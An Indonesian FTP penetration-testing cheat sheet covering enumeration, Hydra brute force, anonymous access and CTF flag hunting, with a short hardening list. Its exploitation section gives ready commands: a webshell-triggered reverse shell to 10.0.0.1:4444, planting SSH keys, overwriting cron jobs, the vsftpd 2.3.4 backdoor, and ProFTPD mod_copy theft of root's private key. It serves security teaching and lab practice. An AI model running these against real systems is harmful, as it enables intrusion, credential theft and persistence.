# FTP Penetration Testing & Command Cheat Sheet

> **Tujuan:** Panduan lengkap enumerasi, login anonymous, eksploitasi, transfer berkas masal, dan pengerasan keamanan FTP service dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `ftp`, `lftp`, `wget`, `nmap`, `hydra`

---

## Penjelasan Singkat

| Item | Detail |
|------|--------|
| **Default Port** | `21/tcp` (Control Connection), `20/tcp` (Active Data Connection) |
| **Config Server** | vsftpd: `/etc/vsftpd.conf`<br>ProFTPD: `/etc/proftpd/proftpd.conf` |
| **Kredensial Anonymous** | Username: `anonymous` atau `ftp`<br>Password: *kosong* atau `anonymous@domain.com` |

---

## Langkah 1: Reconnaissance & Enumeration

### 1. Nmap Scan & Enumeration Script

```bash
# Scan port 21 & deteksi versi service FTP
nmap -p 21 -sV <TARGET>

# Cek apakah Anonymous FTP Login diizinkan
nmap -p 21 --script ftp-anon <TARGET>

# Audit seluruh skrip enumerasi FTP bawaan Nmap
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vuln* <TARGET>
```

---

### 2. Brute Force Credentials dengan Hydra

```bash
# Brute force login FTP menggunakan Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> ftp

# Brute force dengan daftar username dan password terpisah
hydra -L users.txt -P passwords.txt <TARGET> ftp -t 4
```

---

## Langkah 2: Koneksi & Interaksi FTP (CLI & Interactive)

### 1. Login Manual via FTP Client CLI

```bash
# Login ke target FTP
ftp <TARGET>

# Jika terhubung, masukkan credential:
# Name: anonymous
# Password: (tekan Enter / isi sembarang)
```

---

### 2. Perintah Dasar Interaktif FTP

```ftp
-- Setel mode transfer ke Binary (Wajib untuk file zip, exe, php, gambar agar tidak corrupt)
ftp> binary

-- Mengaktifkan/menonaktifkan Passive Mode (Gunakan jika error "Entering Passive Mode" / connection hang)
ftp> passive

-- Tampilkan lokasi direktori saat ini
ftp> pwd

-- Tampilkan daftar file termasuk file tersembunyi (.env, .git, dll)
ftp> ls -la

-- Berpindah ke folder tertentu
ftp> cd /pub

-- Naik 1 tingkat folder ke atas
ftp> cd ..

-- Kembali ke root direktori FTP
ftp> cd /

-- Download berkas tunggal
ftp> get file.txt

-- Upload berkas tunggal (jika memiliki write permission)
ftp> put shell.php

-- Download banyak berkas sekaligus
ftp> prompt off
ftp> mget *

-- Keluar dari FTP CLI
ftp> quit
```

---

### 3. Download Seluruh Isi FTP Secara Otomatis (Recursive Mirroring)

#### A. Menggunakan `wget`

```bash
# Download seluruh file & direktori dari Anonymous FTP
wget -r --no-passive-ftp ftp://anonymous:anonymous@<TARGET>/

# Download dengan menyertakan kredensial tertentu
wget -r ftp://username:password@<TARGET>/
```

### 4. Teknik Mencari & Membaca Berkas Flag (CTF / Pentest Lab)

#### A. Membaca Langsung Berkas Flag Tanpa Mengunduh (CLI One-Liner)

```bash
# Baca langsung berkas flag.txt menggunakan curl (stdout)
curl -s ftp://<TARGET>/flag.txt
curl -s ftp://anonymous:anonymous@<TARGET>/user.txt
curl -s ftp://username:password@<TARGET>/root.txt

# Baca langsung berkas flag menggunakan wget (stdout)
wget -qO- ftp://anonymous:anonymous@<TARGET>/flag.txt
```

#### B. Mencari Berkas Flag (`flag.txt`, `user.txt`, `root.txt`) di Seluruh Direktori FTP

```bash
# Mencari lokasi file flag secara otomatis menggunakan lftp
lftp -u anonymous,anonymous <TARGET> -e "find . | grep -i flag; quit"

# Download seluruh struktur direktori FTP lalu cari flag secara lokal
wget -r --no-passive-ftp ftp://anonymous:anonymous@<TARGET>/
find . -iname "*flag*" -o -iname "user.txt" -o -iname "root.txt"

# Mencari string format flag (misal: flag{...} atau CTF{...}) di dalam file
grep -rni "flag{" .
grep -rni "CTF{" .
```

#### C. Membaca Berkas Flag di Dalam FTP CLI Interaktif

```ftp
-- Download dan tampilkan isi flag.txt langsung di terminal (stdout menggunakan parameter '-')
ftp> get flag.txt -
ftp> get user.txt -
```

---

## Langkah 3: Eksploitasi & Post-Exploitation (Mendapatkan Shell via FTP)

### 1. Upload PHP Webshell (Jika FTP Root Berada di Web Root)

*Jika FTP root berlokasi di direktori web server (misalnya `/var/www/html`) dan user FTP memiliki izin upload/write:*

```bash
# 1. Upload PHP Webshell ke FTP root
ftp> put reverse_shell.php /var/www/html/shell.php

# 2. Setelah diunggah, eksekusi webshell via browser/curl:
curl http://<TARGET>/shell.php?cmd=id

# 3. Trigger Reverse Shell via curl:
curl "http://<TARGET>/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261'"
```

---

### 2. Upload SSH Authorized Key (Akses Direct SSH Shell)

*Jika FTP mengizinkan navigasi dan penulisan ke direktori home user (`/home/username/`):*

```bash
# 1. Generate SSH keypair di mesin attacker
ssh-keygen -t rsa -f mykey

# 2. Upload public key ke ~/.ssh/authorized_keys via FTP
ftp> cd /home/target_user/.ssh
ftp> put mykey.pub authorized_keys

# 3. Login SSH langsung menggunakan private key
chmod 600 mykey
ssh -i mykey target_user@<TARGET>
```

---

### 3. Overwrite Cron Job / Executable File

*Jika user FTP dapat menulis berkas di lokasi cronjob/skrip berkala:*

```bash
# Upload skrip malicious yang menimpa cronjob target
ftp> put reverse_cron.sh /etc/cron.hourly/backup.sh
```

---

### 4. Eksploitasi Kerentanan Versi FTP Spesifik (Known CVEs Direct RCE)

#### A. vsftpd 2.3.4 Backdoor Command Execution
- **Ciri khas:** Jika versi service yang terdeteksi adalah `vsftpd 2.3.4`.
- **Eksploitasi:** Mengirimkan username yang diakhiri simbol `:)` (misalnya `user:)`), yang akan membuka listener backdoor pada port `6200/tcp`.

```bash
# Menggunakan Metasploit Module
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS <TARGET>; run"
```

#### B. ProFTPD 1.3.5 Arbitrary File Copy (mod_copy)
- **Ciri khas:** Perintah kustom `SITE CPFR` (copy from) dan `SITE CPTO` (copy to) dapat dieksekusi tanpa otentikasi.

```bash
# Salin file sensitif (/etc/passwd atau SSH key) ke web root
nc <TARGET> 21
SITE CPFR /root/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa

# Unduh kunci via HTTP/wget:
wget http://<TARGET>/id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@<TARGET>
```

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **Nonaktifkan Anonymous Login**: Ubah parameter `anonymous_enable=NO` pada `/etc/vsftpd.conf`.
- **Aktifkan Chroot Jail**: Pastikan parameter `chroot_local_user=YES` aktif agar user FTP tidak bisa menjelajah ke direktori root sistem (`/`).
- **Gunakan Protokol Terenkripsi (SFTP / FTPS)**: Plaintext FTP mengirimkan kredensial dan data secara unencrypted di jaringan, yang mudah di-sniff via Wireshark.
- **Batasi Hak Akses Write**: Hanya berikan izin upload pada direktori spesifik yang tidak dapat mengeksekusi skrip web (`non-executable directory`).

---

## Checklist Penetration Testing FTP

- [ ] Port `21` diperiksa status dan versinya via Nmap
- [ ] Uji login Anonymous (`anonymous:anonymous` / `ftp:ftp`)
- [ ] Cek hak akses baca dan tulis pada direktori FTP (`ls -la`, `put`, `get`)
- [ ] Unduh dan periksa file sensitif tersembunyi (`.env`, `.git`, `config.php`, backup database)
- [ ] Uji upload berkas eksekutabel / webshell jika FTP terhubung ke web root
- [ ] Periksa potensi versi rentan (vsftpd 2.3.4, ProFTPD 1.3.5 mod_copy)
- [ ] Dokumentasikan temuan dan langkah mitigasi
